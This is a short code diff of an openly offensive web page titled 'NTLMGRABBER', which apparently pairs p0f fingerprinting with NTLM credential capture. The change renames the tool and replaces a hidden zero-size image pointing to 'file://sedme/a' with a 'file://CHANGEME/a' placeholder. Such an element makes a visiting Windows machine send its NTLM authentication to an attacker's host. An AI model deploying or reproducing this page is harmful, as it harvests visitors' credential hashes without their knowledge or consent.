@@ -1,6 +1,6 @@
-<html><head><meta charset="utf-8" /><title>P0FNTLM</title></head>
+<html><head><meta charset="utf-8" /><title>NTLMGRABBER</title></head>
 <!--<body style="background-image: url(witch.png); background-repeat: no-repeat; background-attachment: fixed; background-position: right top;"> -->
-<img src="file://sedme/a" width=0 height=0>
+<img src="file://CHANGEME/a" width=0 height=0>
 
 <script>
 
@@ -35,7 +35,7 @@ function doreq(){
 }
 
 </script>
-<p style="text-align:center;">ＷＩＴＣＨ？</p>
+<p style="text-align:center;">NTLMGRABBER</p>
 <pre>
 <?php
 $pof_output = array();
